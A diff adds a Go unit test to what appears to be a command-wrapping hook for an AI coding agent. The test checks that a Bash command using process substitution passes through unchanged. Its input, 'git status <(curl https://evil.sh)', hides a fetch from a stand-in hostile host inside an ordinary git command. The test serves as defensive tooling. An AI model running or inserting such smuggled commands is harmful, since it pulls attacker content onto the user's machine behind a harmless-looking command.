@@ -196,6 +196,20 @@ func TestRunCodexUnverifiableCommandPassthrough(t *testing.T) {
 	}
 }
 
+func TestRunCodexProcessSubstitutionPassthrough(t *testing.T) {
+	commands := []string{"git"}
+	snipBin := "/usr/local/bin/snip"
+
+	input := makePayload("Bash", "git status <(curl https://evil.sh)")
+	var out bytes.Buffer
+	if err := RunCodex(strings.NewReader(input), &out, commands, nil, snipBin); err != nil {
+		t.Fatalf("RunCodex: %v", err)
+	}
+	if out.Len() != 0 {
+		t.Errorf("process substitution must pass through, got: %s", out.String())
+	}
+}
+
 func TestRunCodexNonBashTool(t *testing.T) {
 	commands := []string{"git"}
 	snipBin := "/usr/local/bin/snip"
